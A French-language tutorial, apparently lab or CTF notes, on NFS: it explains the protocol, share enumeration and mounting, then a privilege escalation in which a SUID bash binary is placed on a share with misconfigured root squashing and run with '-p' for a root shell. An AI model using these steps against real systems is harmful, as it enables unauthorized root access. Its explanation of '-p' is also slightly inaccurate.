
# Les bases des exploits NFS

## Introduction

Le protocole NFS (Network File System) est un protocole de partage de fichiers qui permet aux utilisateurs de se connecter à un serveur et d'accéder à des fichiers distants comme s'ils étaient stockés localement. Il est utilisé pour partager des fichiers, des répertoires et des périphériques sur un réseau. Il est basé sur le protocole RPC (Remote Procedure Call) et utilise le protocole TCP/IP pour la communication entre les machines. Il permet à un système de partager des répertoires et des fichiers avec d'autres sur un réseau. En utilisant NFS, les utilisateurs et les programmes peuvent accéder à des fichiers sur des systèmes distants presque comme s'il s'agissait de fichiers locaux. Pour ce faire, il monte tout ou partie d'un système de fichiers sur un serveur. Les clients peuvent accéder à la partie du système de fichiers qui est montée avec les privilèges attribués à chaque fichier.

Le protocole NFS permet de transférer des fichiers entre des ordinateurs fonctionnant sous Windows et d'autres systèmes d'exploitation non Windows, tels que Linux, MacOS ou UNIX.

Un ordinateur fonctionnant sous Windows Server peut faire office de serveur de fichiers NFS pour d'autres ordinateurs clients ne fonctionnant pas sous Windows. De même, NFS permet à un ordinateur Windows fonctionnant sous Windows Server d'accéder à des fichiers stockés sur un serveur NFS non Windows.

### Fonctionnement succinct du protocole NFS

Tout d'abord, le client demande à monter un répertoire d'un hôte distant sur un répertoire local, de la même manière qu'il peut monter un périphérique physique. Le service de montage se connecte alors au démon de montage correspondant à l'aide de RPC.

Le serveur vérifie si l'utilisateur a le droit de monter le répertoire demandé. Il renvoie ensuite une poignée de fichier qui identifie de manière unique chaque fichier et répertoire se trouvant sur le serveur.

Si quelqu'un souhaite accéder à un fichier à l'aide de NFS, un appel RPC est lancé à NFSD (le démon NFS) sur le serveur. Cet appel prend des paramètres tels que :

* l'identifiant du fichier
* le nom du fichier auquel il faut accéder
* l'ID de l'utilisateur
* l'ID du groupe de l'utilisateur

Ces éléments sont utilisés pour déterminer les droits d'accès au fichier spécifié. C'est ce qui contrôle les autorisations de l'utilisateur, c'est-à-dire la lecture et l'écriture des fichiers.


## Enumeration

### Packet nécessaire

Tout d'abord, il faut avoir le paquet nfs-common installé sur la machine. Pour cela, il suffit de rentrer la commande suivante :

```bash
sudo apt install nfs-common
```
### Ports de base NFS

Le port de base NFS est le port 2049. C'est du TCP/IP.

### Enumération des partages NFS

Pour lister les partages NFS, il suffit de rentrer la commande suivante :

```bash
showmount -e [IP]
```

### Montage d'un partage NFS

Le client a besoin d'un point de montage local pour accéder au système de fichiers NFS partagé. Le point de montage peut être un répertoire vide ou un répertoire existant avec des fichiers. Le client peut monter le système de fichiers NFS partagé sur un point de montage local à l'aide de la commande mount.

```bash
sudo mount -t nfs [IP]:[PATH] [PATH] -nolock
```

TAG | Description
--- | ---
`-t nfs` | spécifie le type de système de fichiers
`[IP]:[PATH]` | spécifie l'adresse IP du serveur NFS et le chemin d'accès au partage NFS
`[PATH]` | spécifie le chemin d'accès au point de montage local
`-nolock` | Spécifie de ne pas utiliser le verrouillage NLM


### Démontage d'un partage NFS

Pour démonter un partage NFS, il suffit de rentrer la commande suivante :

```bash
sudo umount [PATH]
```
## Exploitation d'un partage NFS

### Gains de privilèges

#### Exploitation de l'UID

Prérequis : avoir réussi à se connecter en SSH sur la machine cible

Si le serveur NFS est configuré pour utiliser des UID statiques, il est possible de créer un utilisateur avec un UID bas et de se connecter en tant que cet utilisateur pour obtenir des privilèges plus élevés.

Méthode : 

1. Se connecter en tant qu'utilisateur avec un UID bas
2. Téléchargement de l'exécutable Bash sur le partage NFS
3. Définir les permissions SUID via NFS en raison d'une mauvaise configuration de la racine Squash
4. Connexion par SSH
5. Exécuter l'exécutable SUID Bit Bash
6. ROOT ACCESS

La cible étant un serveur Ubuntu Server 18.04 nous utiliserons un exécutable bash standard d'Ubuntu, le même que celui du serveur (le type de serveur a été su grâce à notre analyse nmap).
Lexécutable est disponible sur ce [github](https://github.com/polo-sec/writing/tree/master)
Attention à ne télécharger que l'exécutable voulu : bash
L'exécutable : 

```bash
wget https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash
```

Il faut changer les permission de l'exécutable en lui rajoutant le bit SUID :

```bash
chmod +s bash
```

Il faut aussi lui ajouter les droits d'exécution s'il ne l'a pas : 

```bash
chmod +x bash
```

Les droits du fichier devraient ressembler à ça :

```bash
-rwsr-sr-x 1 root root 1.3M Apr  4  2018 bash
```

Il faut le mettre dans le répertoire monté en nfs et se connecter en SSH sur la machine cible.
Enfin, il suffit de l'exécuter avec :

```bash
./bash -p
```

Le flag -p permet de garder les droits de l'utilisateur actuel, ce qui permet d'obtenir un shell root.
